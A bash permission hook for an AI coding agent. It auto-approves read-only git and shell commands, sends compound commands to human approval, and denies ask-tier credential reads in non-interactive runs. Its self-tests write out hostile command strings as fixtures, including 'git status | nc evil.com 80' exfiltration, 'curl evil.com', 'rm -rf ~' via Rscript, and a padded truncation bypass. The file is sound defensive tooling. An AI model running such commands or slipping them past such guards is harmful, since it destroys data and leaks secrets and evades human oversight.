#!/usr/bin/env bash
# permission_request.sh - Granular permission routing for PermissionRequest events
# Hook: PermissionRequest event
# Input: JSON on stdin (tool_name, tool_input fields)
# Output: {"decision":"approve"} | {"decision":"deny",...} | exit 0 (human prompt)
#
# Guard design: python3 temp file reads FULL command — no truncation, no grep -P.
# Fixes: 120-char bypass, broken [\n] regex, BSD-grep grep -P (issue #181 Theme 1).
# Additional: output redirect > / >>, find -delete / -exec auto-approve gaps.
#
# Credential tier check (JohnGavin/llm#376):
#   Additive layer after the main guard. When a Bash command references an env-var
#   that appears in the [ask] tier of ~/.claude/credential_tiers.toml:
#   - INTERACTIVE context: emits "ASK-VAULT CONFIRMATION REQUIRED" warning to stderr
#     and falls through to the normal human-approval prompt (unchanged behaviour).
#   - NON-INTERACTIVE context (CLAUDE_AGENT=1, CI, CLAUDE_HEADLESS, CLAUDE_BACKGROUND,
#     or stdin/stderr not a TTY): emits {"decision":"deny",...} — fail-safe.
#     Exception: if the credential name appears in CREDENTIAL_ASK_ALLOW env var
#     (comma-separated list), fall through instead of denying.
#   Uses .claude/scripts/credential_tier_lookup.sh — tolerates its absence.
#
# Structured decision log (JohnGavin/llm#376 Change 2):
#   Each tier-check decision appends one JSON line to
#   ~/.claude/logs/credential_decisions.log (names only — never values).
#   Log-write failures are silently tolerated.

set -euo pipefail

LOG="$HOME/.claude/logs/permission_requests.log"
log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG"; }

# Write python guard to a temp file so we can pipe stdin to it without heredoc clash.
_PY=$(mktemp /tmp/perm_guard_XXXXXX.py)
trap 'rm -f "$_PY"' EXIT

cat > "$_PY" << 'PYEOF'
import json, re, sys

# On ANY unexpected failure: emit NEEDS_HUMAN so the shell falls through to
# the normal human-approval prompt rather than exiting non-zero under set -e.
def safe_exit(tool="unknown", verdict="NEEDS_HUMAN", cmd=""):
    print(tool)
    print(verdict)
    print(cmd[:200])
    sys.exit(0)

try:
    d = json.load(sys.stdin)
except Exception:
    safe_exit()

try:
    tool = d.get("tool_name", "unknown")
    raw_ti = d.get("tool_input", {})
    # Treat null / string / non-dict tool_input as empty dict (avoids AttributeError)
    ti = raw_ti if isinstance(raw_ti, dict) else {}
    # FULL command — no truncation in the guard path
    cmd = str(ti.get("command", ti.get("path", ti.get("url", ""))))
except Exception:
    safe_exit()

# Metacharacter guard — FULL cmd, no truncation. Order: cheapest first.
try:
    reason = None

    if ";" in cmd:
        reason = "semicolon"
    elif "&&" in cmd:
        reason = "&&"
    elif "||" in cmd:
        reason = "||"
    elif "`" in cmd:
        reason = "backtick"
    elif "$(" in cmd:
        reason = "subshell $("
    elif "\n" in cmd:
        reason = "newline"
    elif "\r" in cmd:
        reason = "carriage-return"
    elif ">>" in cmd:
        reason = "append redirect >>"
    elif re.search(r'(?<!>)>(?![>=])', cmd):   # bare > (not >> or >=)
        reason = "output redirect >"
    else:
        if re.search(r'(?<!\|)\|(?!\|)', cmd):    # bare pipe (not ||)
            reason = "bare pipe"
        elif re.search(r'(?<!&)&(?!&)', cmd):     # bare & (not &&)
            reason = "bare background &"

    if reason:
        safe_exit(tool, "UNSAFE:" + reason, cmd)

    # Read-only matchers (guard passed — no metachar). \s+ matches tab/multispace.
    verdict = "NEEDS_HUMAN"
    if re.match(
        r'^git\s+(-C\s+\S+\s+)?(status|log|diff|show|branch|remote|tag|describe|rev-parse)(\s|$)',
        cmd
    ):
        verdict = "APPROVE_GIT"
    elif re.match(
        r'^(ls|which|stat|wc|head|tail|cat|file|du|df|pwd|echo|printf|uname|sw_vers)(\s|$)',
        cmd
    ):
        # NOTE: `find` is intentionally excluded from APPROVE_BASH.
        # A blacklist of dangerous find flags (-exec, -execdir, -ok, -okdir, -delete,
        # -fprint, -fls) is too subtle — new dangerous flags are added without
        # updating the guard. Instead, find always goes through normal human approval.
        verdict = "APPROVE_BASH"

    safe_exit(tool, verdict, cmd)

except Exception:
    safe_exit(tool if 'tool' in dir() else "unknown", "NEEDS_HUMAN",
              cmd if 'cmd' in dir() else "")
PYEOF

# ── Self-test mode ──────────────────────────────────────────────────────
# Usage: PERMISSION_REQUEST_SELFTEST=1 bash .claude/hooks/permission_request.sh
# Accept both PERMISSION_REQUEST_SELFTEST and CLAUDE_HOOK_SELFTEST (per agent_push_guard.sh convention)
_SELFTEST="${PERMISSION_REQUEST_SELFTEST:-${CLAUDE_HOOK_SELFTEST:-0}}"
if [ "$_SELFTEST" = "1" ]; then
  _pass=0; _fail=0
  SCRIPT_PATH="$(realpath "$0")"

  _selftest_case() {
    local desc="$1" payload="$2" expect="$3"
    # Optional 4th arg: extra env vars for the sub-invocation
    local extra_env="${4:-}"
    local out
    out=$(printf '%s' "$payload" | \
      env PERMISSION_REQUEST_SELFTEST=0 $extra_env /usr/bin/env bash "$SCRIPT_PATH" 2>/dev/null \
      || true)
    local approved=0 denied=0
    printf '%s' "$out" | grep -q '"approve"' && approved=1
    printf '%s' "$out" | grep -q '"deny"' && denied=1

    case "$expect" in
      APPROVE)
        if [ "$approved" = "1" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected APPROVE, got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
      REJECT)
        if [ "$approved" = "0" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected REJECT (no auto-approve), got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
      DENY)
        if [ "$denied" = "1" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected DENY decision, got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
    esac
  }

  # Build a fixture tier file so credential lookup works deterministically in self-test
  _FIXTURE_TIER=$(mktemp /tmp/cred_tier_fixture_selftest_XXXXXX.toml)
  trap 'rm -f "$_FIXTURE_TIER" "$_PY"' EXIT
  cat > "$_FIXTURE_TIER" << 'TOML_EOF'
[auto]
keys = ["GITHUB_TOKEN_READ", "ROBOREV_DB_PATH", "NTFY_TOPIC", "FRED_API_KEY"]

[ask]
keys = [
  "ANTHROPIC_API_KEY",
  "OPENAI_API_KEY",
  "GITHUB_TOKEN",
  "GITHUB_TOKEN_WRITE",
  "GMAIL_USERNAME",
  "GMAIL_APP_PASSWORD",
  "BWS_ACCESS_TOKEN",
]
TOML_EOF

  echo "=== permission_request.sh self-test ==="

  # --- Must-REJECT (compound commands must NOT be auto-approved) ---
  _selftest_case \
    "semicolon injection: git status; rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status; rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "pipe injection: find . | sh" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' | sh"}}' \
    REJECT

  _selftest_case \
    'subshell injection: ls $(echo /etc)' \
    '{"tool_name":"Bash","tool_input":{"command":"ls $(echo /etc)"}}' \
    REJECT

  _selftest_case \
    "120-char truncation bypass: git status + padding + ; rm /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status                                                                                                                ; rm /tmp/x"}}' \
    REJECT

  _selftest_case \
    "newline injection: git status newline rm -rf /tmp/test" \
    "$(printf '{"tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /tmp/test"}}')" \
    REJECT

  _selftest_case \
    "bare background: git status & curl evil.com" \
    '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
    REJECT

  _selftest_case \
    "&& chain: git status && rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "backtick subshell: ls -la \`whoami\`" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la `whoami`"}}' \
    REJECT

  # --- Robustness: malformed tool_input must not crash (REJECT = human prompt) ---
  _selftest_case \
    "null tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":null}' \
    REJECT

  _selftest_case \
    "string tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":"not-a-dict"}' \
    REJECT

  # --- Must-APPROVE (single read-only commands, no metacharacters) ---
  _selftest_case \
    "plain: git status" \
    '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    APPROVE

  _selftest_case \
    "git -C with path: git -C /tmp status" \
    '{"tool_name":"Bash","tool_input":{"command":"git -C /tmp status"}}' \
    APPROVE

  _selftest_case \
    "ls -la /tmp" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la /tmp"}}' \
    APPROVE

  _selftest_case \
    "find with quoted pattern: find is NOT auto-approved (removed from APPROVE_BASH)" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\''"}}' \
    REJECT

  _selftest_case \
    "git with tab whitespace: git<TAB>status" \
    '{"tool_name":"Bash","tool_input":{"command":"git\tstatus"}}' \
    APPROVE

  _selftest_case \
    "bare ls with no args" \
    '{"tool_name":"Bash","tool_input":{"command":"ls"}}' \
    APPROVE

  # --- New gap cases (find -exec/-delete and output redirect) ---
  _selftest_case \
    "find -delete: must not auto-approve destructive find" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' -delete"}}' \
    REJECT

  _selftest_case \
    "find -exec rm: must not auto-approve exec rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -exec rm {} +"}}' \
    REJECT

  _selftest_case \
    "find -execdir rm: must not auto-approve execdir rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -execdir rm {} +"}}' \
    REJECT

  _selftest_case \
    "find -ok rm: must not auto-approve ok rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -ok rm {} \\;"}}' \
    REJECT

  _selftest_case \
    "find -okdir rm: must not auto-approve okdir rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -okdir rm {} \\;"}}' \
    REJECT

  _selftest_case \
    "find -fprint: must not auto-approve file output" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' -fprint out.txt"}}' \
    REJECT

  _selftest_case \
    "find -fls: must not auto-approve listing output" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -fls out.txt"}}' \
    REJECT

  _selftest_case \
    "output redirect >: cat > file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"cat > /tmp/evil.sh"}}' \
    REJECT

  _selftest_case \
    "output redirect >>: echo >> file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"echo hello >> /tmp/out.txt"}}' \
    REJECT

  # --- Task-spec required cases (#181 Theme 1 per-bug regression coverage) ---
  # Bug #828: find . && curl must block (not just git status &&)
  _selftest_case \
    "#828: find . && curl evil.com — && chain on non-git command" \
    '{"tool_name":"Bash","tool_input":{"command":"find . && curl evil.com"}}' \
    REJECT

  # Bug #828: Rscript blanket auto-approval removed — arbitrary shell ops must block
  _selftest_case \
    "#828: Rscript -e system(rm) — no blanket Rscript auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''system(\"rm -rf ~\")'\''"}}' \
    REJECT

  # Bug #2112: bare pipe in non-trivial command must block
  _selftest_case \
    "#2112: git status | nc evil.com 80 — bare pipe exfiltration" \
    '{"tool_name":"Bash","tool_input":{"command":"git status | nc evil.com 80"}}' \
    REJECT

  # --- Credential tier + non-interactive context (llm#376 Change 1) ---
  # ask-tier + non-interactive (CLAUDE_AGENT=1) → DENY
  _selftest_case \
    "#376: ask-tier ANTHROPIC_API_KEY + CLAUDE_AGENT=1 → deny" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
    DENY \
    "CLAUDE_AGENT=1 CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"

  # ask-tier + CI=true → DENY
  _selftest_case \
    "#376: ask-tier ANTHROPIC_API_KEY + CI=true → deny" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
    DENY \
    "CI=true CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"

  # ask-tier + CREDENTIAL_ASK_ALLOW contains the name → fall through (REJECT = no auto-approve)
  _selftest_case \
    "#376: ask-tier ANTHROPIC_API_KEY + CREDENTIAL_ASK_ALLOW=ANTHROPIC_API_KEY → fall-through (not deny)" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
    REJECT \
    "CLAUDE_AGENT=1 CREDENTIAL_ASK_ALLOW=ANTHROPIC_API_KEY CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"

  # auto-tier + non-interactive → unaffected (no deny, no special treatment)
  _selftest_case \
    "#376: auto-tier FRED_API_KEY + CLAUDE_AGENT=1 → unaffected (fall-through, not deny)" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"FRED_API_KEY\")'\''"}}' \
    REJECT \
    "CLAUDE_AGENT=1 CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"

  # interactive ask-tier → fall-through (no deny, no auto-approve)
  # Simulate interactive by NOT setting CLAUDE_AGENT and not using TTY detection
  # (in self-test the shell has no TTY so we rely on CLAUDE_AGENT being absent)
  # We check: output does NOT contain "deny" and does NOT contain "approve"
  _selftest_case \
    "#376: ask-tier BWS_ACCESS_TOKEN + interactive (no CLAUDE_AGENT) → fall-through (not deny, not approve)" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"BWS_ACCESS_TOKEN\")'\''"}}' \
    REJECT \
    "CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"

  echo "=== Results: $_pass passed, $_fail failed (33 total) ==="
  [ "$_fail" -eq 0 ] && exit 0 || exit 1
fi

_input=$(cat)

# ── All extraction + guard logic in python3 ────────────────────────────
# Returns 3 lines: tool_name / verdict / command[:200]
# Verdict values: UNSAFE:<reason> | APPROVE_GIT | APPROVE_BASH | NEEDS_HUMAN
_verdict=$(printf '%s' "$_input" | python3 "$_PY")

_tool=$(printf '%s' "$_verdict" | sed -n '1p')
_guard=$(printf '%s' "$_verdict" | sed -n '2p')
_action_log=$(printf '%s' "$_verdict" | sed -n '3p')

log "REQUEST: tool=$_tool action=$_action_log"

# ── Auto-approve: read-only tools ──────────────────────────────────────
case "$_tool" in
  Read|Glob|Grep|WebFetch|WebSearch|ListMcpResourcesTool|ReadMcpResourceTool)
    log "AUTO-APPROVE: read-only tool $_tool"
    printf '{"decision":"approve","reason":"Read-only tool"}\n'
    exit 0
    ;;
esac

# ── Bash-specific guard and auto-approval ──────────────────────────────
if [ "$_tool" = "Bash" ]; then
  # SECURITY GUARD: python3 checks FULL command for metacharacters.
  # UNSAFE:<reason> means compound/injectable — fall through to human prompt.
  case "$_guard" in
    UNSAFE:*)
      log "COMPOUND-REJECTED (${_guard#UNSAFE:}): $_action_log"
      # Exit 0 with no output → normal human-approval prompt
      exit 0
      ;;
    APPROVE_GIT)
      log "AUTO-APPROVE: read-only git: $_action_log"
      printf '{"decision":"approve","reason":"Read-only git command"}\n'
      exit 0
      ;;
    APPROVE_BASH)
      log "AUTO-APPROVE: read-only bash: $_action_log"
      printf '{"decision":"approve","reason":"Read-only inspection command"}\n'
      exit 0
      ;;
    # NEEDS_HUMAN falls through to notification below
  esac
  # Rscript REMOVED from auto-approve: can execute arbitrary fs/network/process ops.
  # Require human approval for every Rscript call (see Finding 2 in issue #181).
fi

# ── Credential tier check (additive, JohnGavin/llm#376) ───────────────
# Scan the command for env-var patterns (Sys.getenv("VAR"), $VAR, ${VAR}).
# For each candidate name, look it up via credential_tier_lookup.sh.
#
# Non-interactive context: treat as non-interactive when stdin/stderr is not a
# TTY, or when CLAUDE_AGENT=1, CI=true/1, CLAUDE_HEADLESS, or CLAUDE_BACKGROUND
# is set. Matches CLAUDE_AGENT convention used in incident_response.sh.
#
# ask-tier + non-interactive → fail-safe deny (llm#376 Phase 1/2 hardening).
# ask-tier + interactive     → warn stderr, fall through (unchanged behaviour).
# CREDENTIAL_ASK_ALLOW env var: comma-separated names that bypass the deny.
# Tolerates: missing lookup script, missing tier file, lookup errors.

_TIER_LOOKUP_SCRIPT="$(dirname "$0")/../scripts/credential_tier_lookup.sh"
_CRED_DECISIONS_LOG="$HOME/.claude/logs/credential_decisions.log"

# Helper: append one JSON line to decision log — fail-open, names only
_log_cred_decision() {
  local _ts _name _tier _dec _ctx _reason
  _ts="$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  _name="$1"; _tier="$2"; _dec="$3"; _ctx="$4"; _reason="$5"
  mkdir -p "$(dirname "$_CRED_DECISIONS_LOG")" 2>/dev/null || true
  printf '{"ts":"%s","credential_name":"%s","tier":"%s","requesting_tool":"%s","decision":"%s","context":"%s","reason":"%s"}\n' \
    "$_ts" "$_name" "$_tier" "$_tool" "$_dec" "$_ctx" "$_reason" \
    >> "$_CRED_DECISIONS_LOG" 2>/dev/null || true
}

# Detect non-interactive context
_is_noninteractive=0
if ! [ -t 0 ] 2>/dev/null || ! [ -t 2 ] 2>/dev/null; then
  _is_noninteractive=1
fi
if [ "${CLAUDE_AGENT:-0}" = "1" ] || \
   [ "${CI:-}" = "true" ] || [ "${CI:-}" = "1" ] || \
   [ -n "${CLAUDE_HEADLESS:-}" ] || [ -n "${CLAUDE_BACKGROUND:-}" ]; then
  _is_noninteractive=1
fi
_ctx_label="interactive"
[ "$_is_noninteractive" = "1" ] && _ctx_label="non-interactive"

if [ -f "$_TIER_LOOKUP_SCRIPT" ] && [ "$_guard" != "UNSAFE:"* ] 2>/dev/null; then
  # Extract candidate var names from the action log (truncated to 200 chars by python).
  # Patterns matched: Sys.getenv("VAR"), $VAR, ${VAR}
  _cred_candidates=$(printf '%s' "$_action_log" | \
    grep -oE 'Sys\.getenv\("([A-Z_][A-Z0-9_]*)"\)|\$\{?([A-Z_][A-Z0-9_]*)' | \
    grep -oE '[A-Z_][A-Z0-9_]+' | sort -u || true)

  _ask_vars=""
  _deny_vars=""
  for _cvar in $_cred_candidates; do
    _tier=$(bash "$_TIER_LOOKUP_SCRIPT" "$_cvar" 2>/dev/null || true)
    if [ "$_tier" = "ask" ]; then
      _ask_vars="${_ask_vars} ${_cvar}"

      if [ "$_is_noninteractive" = "1" ]; then
        # Check per-job pre-authorization via CREDENTIAL_ASK_ALLOW (comma-separated)
        _allowlisted=0
        if [ -n "${CREDENTIAL_ASK_ALLOW:-}" ]; then
          case ",$CREDENTIAL_ASK_ALLOW," in
            *,"$_cvar",*) _allowlisted=1 ;;
          esac
        fi

        if [ "$_allowlisted" = "1" ]; then
          log "ASK-VAULT-ALLOWLISTED: ${_cvar} pre-authorized via CREDENTIAL_ASK_ALLOW in non-interactive context"
          _log_cred_decision "$_cvar" "ask" "allowlisted" "non-interactive" \
            "pre-authorized via CREDENTIAL_ASK_ALLOW"
        else
          _deny_vars="${_deny_vars} ${_cvar}"
        fi
      fi
    fi
  done

  # Non-interactive ask-tier → fail-safe deny
  if [ -n "$_deny_vars" ]; then
    _deny_msg="ask-tier credential(s)${_deny_vars} require interactive human confirmation; denied in non-interactive context (#376)"
    log "ASK-VAULT-DENY: non-interactive, denied:${_deny_vars} -- action=$_action_log"
    for _cvar in $_deny_vars; do
      _log_cred_decision "$_cvar" "ask" "deny" "non-interactive" \
        "ask-tier requires interactive confirmation"
    done
    printf '{"decision":"deny","reason":"%s"}\n' "$_deny_msg"
    exit 0
  fi

  if [ -n "$_ask_vars" ] && [ "$_is_noninteractive" = "0" ]; then
    # Interactive context: warn and fall through to human-approval prompt
    log "ASK-VAULT: ask-tier credentials referenced:${_ask_vars} -- action=$_action_log"
    for _cvar in $_ask_vars; do
      _log_cred_decision "$_cvar" "ask" "approve-fallthrough" "interactive" \
        "interactive: falling through to human approval prompt"
    done
    # Write a prominent warning to stderr (visible in the permission prompt UI)
    printf '\n⚠️  ASK-VAULT CONFIRMATION REQUIRED\n' >&2
    printf '   Ask-tier credential(s) referenced:%s\n' "$_ask_vars" >&2
    printf '   These are in the [ask] tier of ~/.claude/credential_tiers.toml.\n' >&2
    printf '   Confirm you intend to allow agent use of these credentials.\n\n' >&2
  fi
fi

# ── Needs human approval: notify and fall through ─────────────────────
log "NEEDS-APPROVAL: tool=$_tool action=$_action_log"

# Distinctive sound (Sosumi = "so sue me" — the classic Mac warning)
(/usr/bin/afplay -v 0.5 /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null

# Optional ntfy.sh push notification (set NTFY_TOPIC env var to enable)
NTFY_TOPIC="${NTFY_TOPIC:-}"
if [ -n "$NTFY_TOPIC" ]; then
  _short="${_action_log:0:80}"
  curl -s \
    -H "Title: Claude Code: Permission Needed" \
    -H "Priority: high" \
    -H "Tags: warning,lock" \
    -d "Tool: $_tool | $_short" \
    "https://ntfy.sh/$NTFY_TOPIC" >/dev/null 2>&1 &
fi

# Exit 0 → normal permission prompt shown to user
exit 0
